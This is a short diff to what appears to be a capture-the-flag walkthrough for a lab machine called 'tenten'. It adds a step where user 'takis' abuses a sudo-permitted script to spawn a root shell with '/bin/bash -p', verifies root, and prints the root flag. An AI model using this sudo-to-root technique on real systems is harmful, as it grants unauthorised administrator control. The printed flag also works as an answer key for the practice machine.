@@ -344,4 +344,9 @@ takis@tenten:~$ sudo /bin/fuckin ls
 user.txt
 takis@tenten:~$ sudo /bin/fuckin cat /root/root.txt
 958acdb08cecdcdca503d5bdccedf427
+takis@tenten:~$ sudo /bin/fuckin /bin/bash -p
+root@tenten:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@tenten:~# cat /root/root.txt
+958acdb08cecdcdca503d5bdccedf427
 
